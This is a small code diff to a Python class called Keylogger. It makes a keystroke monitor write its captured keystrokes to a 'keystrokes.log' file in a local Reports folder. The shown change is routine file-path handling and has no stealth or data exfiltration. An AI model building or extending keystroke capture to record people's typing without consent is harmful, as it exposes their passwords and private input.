@@ -55,7 +55,9 @@ class Keylogger:
         logging.info("Starting keystroke monitoring")
 
         try:
-            self.keylogger = KeystrokeMonitor()
+            reports_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Reports')
+            log_path = os.path.join(reports_dir, 'keystrokes.log')
+            self.keylogger = KeystrokeMonitor(log_file=log_path)
 
             if not self.keylogger.startLog():
                 print("Failed to start keystroke monitoring.\n")
